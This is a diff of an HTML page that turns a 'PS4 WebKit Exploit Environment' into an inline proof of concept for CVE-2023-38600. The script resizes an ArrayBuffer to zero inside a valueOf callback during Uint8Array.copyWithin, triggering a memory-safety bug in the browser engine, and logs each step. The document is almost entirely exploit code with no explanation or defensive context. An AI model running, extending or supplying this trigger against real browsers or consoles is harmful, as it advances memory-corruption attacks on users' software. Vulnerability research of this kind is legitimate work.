@@ -2,11 +2,34 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PS4 WebKit Exploit</title>
+  <title>CVE-2023-38600 - PoC</title>
 </head>
 <body>
-  <h1>PS4 WebKit Exploit Environment</h1>
   <pre id="log"></pre>
-  <script type="module" src="exploit.js"></script>
+  <script>
+    function log(msg) {
+      const el = document.getElementById("log");
+      el.textContent += msg + "\n";
+      console.log(msg);
+    }
+
+    try {
+      const ab = new ArrayBuffer(0x1000, { maxByteLength: 0x4000 });
+      const u8 = new Uint8Array(ab);
+      
+      function call_back() {
+        log("[+] Inside valueOf(): resizing buffer");
+        ab.resize(0); // unexpected resize during copyWithin!
+        return 0;
+      }
+
+      log("[*] Triggering copyWithin()");
+      u8.copyWithin(0x20, { valueOf: call_back });
+
+      log("[*] copyWithin() completed");
+    } catch (e) {
+      log("[!] Exception: " + e);
+    }
+  </script>
 </body>
 </html>
